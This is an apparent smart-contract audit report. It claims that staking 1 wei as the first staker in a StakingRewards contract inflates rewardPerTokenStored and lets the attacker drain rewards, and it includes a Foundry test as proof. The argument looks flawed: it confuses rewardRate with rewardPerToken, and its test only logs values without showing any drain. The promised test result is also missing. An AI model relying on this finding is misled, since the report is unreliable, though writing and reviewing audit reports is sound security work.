# StakingRewards `rewardPerTokenStored` can be inflated and rewards can be stolen

## Summary

Inflating the `rewardPerTokenStored` is applicable with staking `1 wei` using the first staker and this will lead to drainage of rewards.

## Vulnerability Detail

As there isn't a minimum deposit amount criteria, any amount can be staked inside the StakingRewards contract. Considering this fact, when a user calls `stake()` with `1 wei`, it updates the `_totalSupply` as `1 wei` and the corresponding rewards through `updateReward` modifier. This modifier calls the function `rewardPerToken()`:

```Solidity
    function rewardPerToken() public view returns (uint256) {
        if (_totalSupply == 0) {
            return rewardPerTokenStored;
        }
        return
            rewardPerTokenStored + (((lastTimeRewardApplicable() - lastUpdateTime) * rewardRate * 1e18) / _totalSupply);
    }
```

This function would return the accumulated `rewardPerTokenStored` plus the linear increase of the reward. Since it depends on the denominator as `_totalSupply`, the whole multiplying will be divided by `1 wei` which will inflate the `rewardPerTokenStored` astronomically. Also there isn't any preventive check for the user to withdraw it in the withdraw function.
Thus, this scenario is applicable here:

1. User stakes `1 wei`
2. The `rewardDistributor` transfers `1 ether` reward tokens to the contract and calls `notifyRewardAmount()` with `1 ether`
3. Some time passes (e.g. 200 seconds)
4. At this time the rewardRate is incorrectly inflated and the user can withdraw and drain the rewards

## Proof of Concept

This test shows the attack vector explained above:

```Solidity
    function testFirstUserInflationAttack() public {

        uint rewardRate = staking.rewardPerToken();
        console.log("Initial Reward Rate is: ", rewardRate);

        address attacker = vm.addr(50);
        stakingToken.mint(attacker, 1 ether);
        vm.startPrank(attacker);
        stakingToken.approve(address(staking), 100 ether);
        staking.stake(1 wei);
        vm.stopPrank();

        vm.warp(block.timestamp + 100);

        vm.startPrank(rewardDistributor);
        rewardToken.transfer(address(staking), 1 ether);
        staking.notifyRewardAmount(1 ether);
        vm.stopPrank();

        vm.warp(block.timestamp + 100);

        rewardRate = staking.rewardPerToken();
        console.log("Reward Rate After Stake is: ", rewardRate);
    }
```

The test result is:

## Impact

The first user can inflate the `rewardPerTokenStored` with staking just `1 wei` and after some time he can drain the accumulated rewards.
